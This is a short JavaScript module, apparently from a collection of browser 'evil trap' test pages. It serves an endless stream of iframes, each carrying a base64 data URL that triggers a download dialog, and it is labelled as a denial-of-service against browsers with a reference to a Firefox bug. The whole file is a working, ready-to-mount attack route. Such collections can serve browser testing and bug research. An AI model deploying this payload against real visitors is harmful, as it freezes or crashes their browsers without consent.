import EvilTrap from '../../EvilTrap';

const { Readable } = require('stream');

const iframeOpen = '<iframe src="data:application/octet-stream;base64,';
const iframeClose = '"></iframe>';

// Send endless stream of iframes with random base64 binaries
function getHandler(req, res) {
  res.setHeader('Content-Type', 'text/html');
  const stream = new Readable({
    read() {
      this.push(iframeOpen);
      this.push(Buffer.from(Math.random().toString()).toString('base64'));
      this.push(iframeClose);
    },
  });
  stream.pipe(res);
}

export default new EvilTrap('Download Dialog DoS', EvilTrap.CATEGORY.DOS, 'Freeze / slow browser by spamming iframes with downloads.', { firefox: '1416761' })
  .routeBuilder((router) => {
    router.get('/', getHandler);
  });
